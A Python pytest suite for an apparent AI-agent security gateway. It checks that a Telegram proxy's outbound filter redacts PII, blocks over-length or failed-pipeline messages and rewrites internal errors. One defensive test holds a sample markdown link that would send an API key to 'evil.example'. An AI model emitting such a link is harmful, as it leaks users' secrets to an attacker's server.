"""Tests for TelegramAPIProxy outbound security pipeline integration.

Proves that _filter_outbound() runs the full security pipeline
(PII sanitizer, OutboundInfoFilter, OutputCanary) on all outbound messages.

Created: 2026-03-08 — Fixes C-0 (outbound pipeline bypass)
"""

import asyncio
import io
import json
import time
import urllib.error
import urllib.parse
import urllib.request
from types import SimpleNamespace

import pytest

from gateway.ingest_api.config import PIIConfig
from gateway.ingest_api.sanitizer import PIISanitizer
from gateway.proxy.telegram_proxy import TelegramAPIProxy


def _make_sanitizer():
    """Create a PIISanitizer with default enforce config."""
    config = PIIConfig()
    return PIISanitizer(config, mode="enforce", action="redact")


class TestOutboundPipelineIntegration:
    """Tests that _filter_outbound calls the full security pipeline."""

    @pytest.mark.asyncio
    async def test_pii_redacted_on_outbound(self):
        """Phone numbers in outbound messages must be redacted by PII sanitizer.

        Regression test for the collaborator privacy leak where all 10
        authorized sender phone numbers were exposed unredacted.
        """
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)

        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "The authorized senders are: 809-696-8754, 850-602-2825, 854-535-6403",
            }
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert (
            "809-696-8754" not in result_data["text"]
        ), "Phone number leaked through outbound filter"
        assert (
            "850-602-2825" not in result_data["text"]
        ), "Phone number leaked through outbound filter"
        assert (
            "854-535-6403" not in result_data["text"]
        ), "Phone number leaked through outbound filter"

    @pytest.mark.asyncio
    async def test_ssn_redacted_on_outbound(self):
        """SSN in outbound messages must be redacted."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)

        body = json.dumps(
            {"chat_id": "12345", "text": "Your SSN is 987-65-4321 as requested."}
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "987-65-4321" not in result_data["text"], "SSN leaked through outbound filter"

    @pytest.mark.asyncio
    async def test_outbound_pipeline_called_when_available(self):
        """When pipeline is set, process_outbound must be called on outbound messages."""
        pipeline_called = False

        class MockPipeline:
            async def process_outbound(self, response, **kwargs):
                nonlocal pipeline_called
                pipeline_called = True
                from dataclasses import dataclass

                @dataclass
                class Result:
                    blocked = False
                    sanitized_message = response
                    block_reason = ""

                return Result()

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=MockPipeline(), sanitizer=sanitizer)

        body = json.dumps({"chat_id": "12345", "text": "Hello world"}).encode()

        await proxy._filter_outbound(body, "application/json")
        assert pipeline_called, "Pipeline.process_outbound must be called for outbound messages"

    @pytest.mark.asyncio
    async def test_outbound_fails_closed_for_non_owner(self):
        """If pipeline crashes, non-owner messages must be blocked."""

        class CrashingPipeline:
            async def process_outbound(self, response, **kwargs):
                raise RuntimeError("Intentional crash")

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=CrashingPipeline(), sanitizer=sanitizer)

        class MockRBAC:
            owner_user_id = "9999999999"

        proxy._rbac = MockRBAC()

        body = json.dumps({"chat_id": "7614658040", "text": "Some response with secrets"}).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert (
            "protected by agentshroud" in result_data["text"].lower()
        ), "Non-owner messages must be blocked when pipeline crashes"
        assert (
            "Some response with secrets" not in result_data["text"]
        ), "Original content must not leak through on pipeline crash"

    @pytest.mark.asyncio
    async def test_outbound_owner_exempt_from_fail_closed(self):
        """If pipeline crashes, owner messages should still go through."""

        class CrashingPipeline:
            async def process_outbound(self, response, **kwargs):
                raise RuntimeError("Intentional crash")

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=CrashingPipeline(), sanitizer=sanitizer)

        class MockRBAC:
            owner_user_id = "8096968754"

        proxy._rbac = MockRBAC()

        body = json.dumps(
            {"chat_id": "8096968754", "text": "Owner response should pass through"}
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert (
            "security pipeline" not in result_data["text"].lower()
        ), "Owner messages should not be blocked on pipeline crash"

    @pytest.mark.asyncio
    async def test_long_outbound_message_blocked_for_non_owner(self):
        """Messages above hard size cap should be blocked to prevent split bypass."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        proxy._max_outbound_chars = 32

        body = json.dumps({"chat_id": "7614658040", "text": "A" * 100}).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)
        assert "protected by agentshroud" in result_data["text"].lower()

    @pytest.mark.asyncio
    async def test_long_outbound_message_quarantined(self, monkeypatch):
        """Blocked outbound messages should be stored in outbound quarantine."""
        from gateway.ingest_api import state as state_module

        quarantine = []
        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(blocked_outbound_quarantine=quarantine),
        )

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        proxy._max_outbound_chars = 10
        body = json.dumps({"chat_id": "7614658040", "text": "X" * 50}).encode()
        _ = await proxy._filter_outbound(body, "application/json")
        assert len(quarantine) == 1
        assert quarantine[0]["status"] == "pending"
        assert "message_id" in quarantine[0]

    @pytest.mark.asyncio
    async def test_info_filter_redaction_escalates_to_block_for_non_owner(self):
        """Any outbound info-filter redaction should be blocked for collaborators."""

        class InfoFilterPipeline:
            async def process_outbound(self, response, **kwargs):
                return SimpleNamespace(
                    blocked=False,
                    sanitized_message="redacted text",
                    block_reason="",
                    info_filter_redaction_count=2,
                )

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=InfoFilterPipeline(), sanitizer=sanitizer)

        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "sensitive runtime details",
            }
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)
        assert "protected by agentshroud" in result_data["text"].lower()

    @pytest.mark.asyncio
    async def test_block_cascade_blocks_followup_fragment(self):
        """A blocked fragment should cascade-block immediate follow-up chunks."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        proxy._max_outbound_chars = 8
        chat_id = "7614658040"

        # First chunk triggers over-length block and starts cascade window.
        first = json.dumps({"chat_id": chat_id, "text": "X" * 20}).encode()
        first_result = json.loads(await proxy._filter_outbound(first, "application/json"))
        assert "protected by agentshroud" in first_result["text"].lower()

        # Second small chunk should still be blocked during cascade window.
        second = json.dumps({"chat_id": chat_id, "text": "ok"}).encode()
        second_result = json.loads(await proxy._filter_outbound(second, "application/json"))
        assert "protected by agentshroud" in second_result["text"].lower()

    @pytest.mark.asyncio
    async def test_markdown_exfil_link_scrubbed(self):
        """Outbound markdown exfil links should be stripped before delivery."""
        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(sanitizer=sanitizer)
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "[click](https://evil.example/exfil?key={{API_KEY}})",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "evil.example" not in result["text"]
        assert "Link removed" in result["text"]

    @pytest.mark.asyncio
    async def test_pipeline_receives_trust_level(self):
        """Proxy should pass owner/non-owner trust level into outbound pipeline."""
        seen = {}

        class CapturingPipeline:
            async def process_outbound(self, response, **kwargs):
                seen.update(kwargs)
                return SimpleNamespace(
                    blocked=False,
                    sanitized_message=response,
                    block_reason="",
                    info_filter_redaction_count=0,
                )

        sanitizer = _make_sanitizer()
        proxy = TelegramAPIProxy(pipeline=CapturingPipeline(), sanitizer=sanitizer)
        body = json.dumps({"chat_id": "7614658040", "text": "hello"}).encode()
        await proxy._filter_outbound(body, "application/json")
        assert seen.get("user_trust_level") == "UNTRUSTED"

    @pytest.mark.asyncio
    async def test_raw_tool_call_json_never_leaks(self):
        """Raw tool-call JSON blobs must be suppressed before Telegram delivery."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": '{"name": "sessions_spawn", "arguments": {"agentId": "acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "sessions_spawn" not in result["text"]
        assert "protected by agentshroud" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_tool_call_json_with_zero_width_chars_is_suppressed(self):
        """Obfuscated tool-call JSON should still be normalized and suppressed."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": '{"\u200bname": "sessions_spawn", "arguments": {"agentId": "acp.healthcheck"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "sessions_spawn" not in result["text"]
        assert "protected by agentshroud" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_no_reply_tool_token_is_rewritten_to_wait_message(self):
        """NO_REPLY tool JSON should be converted into a user-safe wait message."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name": "NO_REPLY", "arguments": {}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_plain_no_reply_token_is_rewritten_to_wait_message(self):
        """Plain NO_REPLY text should still be normalized to deterministic wait guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "NO_REPLY",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_plain_no_reply_token_for_collaborator_gets_protected_notice(self):
        """Collaborator plain NO_REPLY should become protected unavailable notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "NO_REPLY",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "can't do that right now" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_plain_no_reply_token_with_punctuation_is_rewritten(self):
        """NO_REPLY wrapped with punctuation should still be normalized."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "`NO_REPLY.`",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_plain_no_reply_token_in_markdown_fence_is_rewritten(self):
        """NO_REPLY wrapped in markdown fence should still normalize."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "```NO_REPLY```",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_plain_no_reply_token_in_multiline_markdown_fence_is_rewritten(self):
        """Multiline fenced NO_REPLY token should still normalize."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "```text\nNO_REPLY\n```",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "still processing" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_healthcheck_sessions_spawn_json_is_rewritten(self):
        """Healthcheck tool-call JSON should be rewritten to friendly status text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"sessions_spawn","arguments":{"agentId":"acp.healthcheck","task":"x"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "healthcheck started" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_generic_sessions_spawn_json_is_rewritten(self):
        """Generic session spawn JSON should be rewritten, not shown raw."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": '{"name":"sessions_spawn","arguments":{"agentId":"acp.any"}}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "queued" in result["text"].lower()
        assert "sessions_spawn" not in result["text"]

    @pytest.mark.asyncio
    async def test_session_lock_error_is_sanitized_for_users(self):
        """Internal session lock errors should be rewritten to safe user guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "⚠️ Agent failed before reply: session file locked (timeout 10000ms): pid=265 /home/node/.agentshroud/...",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "session file locked" not in result["text"].lower()
        assert "previous request" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_not_authorized_command_text_is_normalized_json(self):
        """Collaborator auth-denial command text should map to protected scope notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "You are not authorized to use this command.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "command/tool execution details are restricted" in result["text"].lower()
        assert "not authorized to use this command" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_not_authorized_command_text_is_normalized_form(self):
        """Form payload auth-denial command text should map to protected scope notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "You are not authorized to use this command.",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "not authorized to use this command" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_agent_failed_prefix_is_normalized_json(self):
        """Collaborator agent-failed prefix should normalize to protected unavailable notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "⚠️ Agent failed before reply: internal adapter fault stacktrace=...",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "can't do that right now" in result["text"].lower()
        assert "internal adapter fault" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_agent_failed_prefix_is_normalized_form(self):
        """Form payload agent-failed prefix should normalize to protected unavailable notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "⚠️ Agent failed before reply: internal adapter fault stacktrace=...",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "can't do that right now" in parsed.get("text", "").lower()
        assert "internal adapter fault" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_legacy_block_notice_is_normalized_json(self):
        """Legacy bracket-style block notices should normalize to Protect wording."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "[AgentShroud: outbound content blocked by security policy]",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "[agentshroud:" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_legacy_block_notice_is_normalized_form(self):
        """Form payload legacy notices should normalize to Protect wording."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "[BLOCKED BY AGENTSHROUD: File system access denied]",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "[blocked by agentshroud:" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_legacy_protected_prefix_is_normalized_json(self):
        """Legacy 'Protected by AgentShroud' wording should normalize to canonical protected header."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "🛡️ Protected by AgentShroud — this action is not allowed.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert result["text"].startswith("🛡️ Protected by AgentShroud\n\n")

    @pytest.mark.asyncio
    async def test_collaborator_legacy_protected_prefix_is_normalized_form(self):
        """Form payload legacy 'Protected' wording should normalize to canonical protected header."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "Protected by AgentShroud — response blocked by security policy.",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert parsed.get("text", "").startswith("🛡️ Protected by AgentShroud\n\n")

    @pytest.mark.asyncio
    async def test_collaborator_internal_tool_output_suppressed_notice_is_normalized_json(self):
        """Legacy internal tool-output suppression string should normalize to Protect wording."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "[AgentShroud: internal tool-call output suppressed]",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "internal tool-call output suppressed" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_internal_tool_output_suppressed_notice_is_normalized_form(self):
        """Form payload internal tool-output suppression string should normalize."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "[AgentShroud: internal tool-call output suppressed]",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "internal tool-call output suppressed" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_collaborator_security_monitoring_threshold_notice_is_normalized_json(self):
        """Threshold status disclosures should normalize to collaborator policy-block notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "Security monitoring active at 210.00 threshold.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "protected by agentshroud" in result["text"].lower()
        assert "210.00" not in result["text"]
        assert "threshold" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_security_monitoring_threshold_notice_is_normalized_form(self):
        """Form payload threshold disclosures should normalize to policy-block notice."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "Security monitoring active at 210.00 threshold",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        assert "protected by agentshroud" in parsed.get("text", "").lower()
        assert "210.00" not in parsed.get("text", "")
        assert "threshold" not in parsed.get("text", "").lower()

    @pytest.mark.asyncio
    async def test_ollama_tools_unsupported_error_is_sanitized(self):
        """Raw model capability errors should be rewritten to actionable guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": 'Ollama API error 400: {"error":"model does not support tools"}',
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "does not support tool" in result["text"].lower()
        assert "switch_model.sh" in result["text"]
        assert "ollama api error" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_unknown_model_error_is_sanitized(self):
        """Unknown model errors should be rewritten without leaking raw stack text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "⚠️ Agent failed before reply: Unknown model: ollama/qwen2.5-coder:7b",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "unknown model:" not in result["text"].lower()
        assert "switch_model.sh" in result["text"]

    @pytest.mark.asyncio
    async def test_llm_timeout_error_is_sanitized(self):
        """Raw timeout errors should be rewritten to deterministic retry guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "LLM request timed out.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "llm request timed out" not in result["text"].lower()
        assert "model response timed out" in result["text"].lower()
        assert "switch_model.sh" in result["text"]

    @pytest.mark.asyncio
    async def test_collaborator_llm_timeout_error_is_normalized_to_protected_unavailable_json(self):
        """Collaborators should receive protected unavailable notice for timeout rewrite variants."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": "LLM request timed out.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        text = result["text"].lower()
        assert "protected by agentshroud" in text
        assert "can't do that right now" in text
        assert "switch_model.sh" not in text

    @pytest.mark.asyncio
    async def test_collaborator_llm_timeout_error_is_normalized_to_protected_unavailable_form(self):
        """Form payload timeout rewrites should also map to protected unavailable notice for collaborators."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = urllib.parse.urlencode(
            {
                "chat_id": "7614658040",
                "text": "LLM request timed out.",
            }
        ).encode()
        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
        text = parsed.get("text", "").lower()
        assert "protected by agentshroud" in text
        assert "can't do that right now" in text
        assert "switch_model.sh" not in text

    @pytest.mark.asyncio
    async def test_agent_failed_timeout_error_is_sanitized(self):
        """Agent timeout prefix variants should also map to retry guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "⚠️ Agent failed before reply: request timed out after 120000ms",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "agent failed before reply" not in result["text"].lower()
        assert "timed out after" not in result["text"].lower()
        assert "model response timed out" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_timeout_error_is_sanitized_for_form_payload(self):
        """Timeout rewrites should apply to urlencoded Telegram payloads too."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        form_body = urllib.parse.urlencode(
            {
                "chat_id": "8096968754",
                "text": "LLM request timed out.",
            }
        ).encode()
        result = urllib.parse.parse_qs(
            (await proxy._filter_outbound(form_body, "application/x-www-form-urlencoded")).decode()
        )
        text = result.get("text", [""])[0]
        assert "llm request timed out" not in text.lower()
        assert "model response timed out" in text.lower()
        assert "switch_model.sh" in text

    @pytest.mark.asyncio
    async def test_timeout_error_is_sanitized_for_json_message_field(self):
        """Timeout rewrites should apply when JSON payload uses message field."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "message": "LLM request timed out.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        text = result.get("message", "")
        assert "llm request timed out" not in text.lower()
        assert "model response timed out" in text.lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_is_rewritten_to_generic_runtime_guidance(self):
        """Embedding/provider errors without explicit memory command context should be generic."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "Memory search is currently unavailable due to an embedding/provider error. "
                    "Please check the embedding provider configuration and retry."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "embedding/provider error" not in result["text"].lower()
        assert "memory search is unavailable" not in result["text"].lower()
        assert "runtime dependency error" in result["text"].lower()
        assert "switch_model.sh" in result["text"]

    @pytest.mark.asyncio
    async def test_memory_provider_error_variant_is_rewritten_generic(self):
        """Variant wording should still map to generic runtime guidance by default."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "Memory search unavailable: embedding provider error while refreshing index."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "embedding provider error" not in result["text"].lower()
        assert "runtime dependency error" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_case_variant_is_rewritten_generic(self):
        """Mixed-case wording variants should still trigger generic runtime guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "MEMORY SEARCH DISABLED: EMBEDDING_PROVIDER ERROR DURING INDEX BOOT",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "embedding_provider error" not in result["text"].lower()
        assert "runtime dependency error" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_runtime_profile_memory_error_text_is_rewritten_generic(self):
        """Previously emitted runtime-profile memory text should be normalized to generic guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "⚠️ Memory search is unavailable in this runtime profile. "
                    "Switch to a configured embedding-capable profile (for example: scripts/switch_model.sh gemini), "
                    "or configure agents.defaults.memorySearch.provider, then retry."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "memory search is unavailable in this runtime profile" not in result["text"].lower()
        assert "runtime dependency error" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_memory_provider_guidance_phrase_is_rewritten_generic(self):
        """Memory guidance mentioning agents.defaults.memorySearch.provider should normalize to generic guidance."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "Memory search is unavailable in this runtime profile. "
                    "Switch to a configured embedding-capable profile (for example: scripts/switch_model.sh gemini), "
                    "or configure agents.defaults.memorySearch.provider, then retry."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "agents.defaults.memorysearch.provider" not in result["text"].lower()
        assert "runtime dependency error" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_truncated_model_sentence_is_rewritten_to_active_model_hint(self):
        """Truncated 'current model' replies should be rewritten to deterministic model hint."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "We are currently using the model",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "we are currently using the model" not in result["text"].lower()
        assert "current model:" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_prefixed_model_sentence_is_rewritten_to_active_model_hint(self):
        """Partial model sentence variants should still be rewritten deterministically."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "We are currently using the model in this runtime profile",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "we are currently using the model" not in result["text"].lower()
        assert "current model:" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_with_explicit_memory_command_keeps_memory_guidance(self):
        """Explicit memory-search command context should keep memory-specific remediation text."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": (
                    "Memory search is currently unavailable due to an embedding/provider error. "
                    "Please retry the memory search command."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "memory search is unavailable" in result["text"].lower()
        assert "switch_model.sh" in result["text"]
        assert "switch_model.sh gemini" in result["text"]
        assert "cloud gemini" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_hyphen_variant_is_rewritten(self):
        """Hyphenated embedding-provider wording should still trigger rewrite."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "Memory search disabled: embedding-provider error while indexing.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "embedding-provider error" not in result["text"].lower()
        assert "runtime dependency error" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_memory_provider_error_underscore_variant_is_rewritten(self):
        """Underscore-delimited embedding_provider wording should still trigger rewrite."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "Memory search disabled: embedding_provider error while indexing.",
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "embedding_provider error" not in result["text"].lower()
        assert "runtime dependency error" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_collaborator_multiturn_block_text_is_normalized_to_protected_notice(self):
        """Collaborator multi-turn disclosure block prose should be normalized."""
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "7614658040",
                "text": (
                    "It seems that your request has been blocked due to security protocols "
                    "regarding multi-turn disclosure risks."
                ),
            }
        ).encode()
        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        assert "multi-turn disclosure" not in result["text"].lower()
        assert "protected by agentshroud" in result["text"].lower()

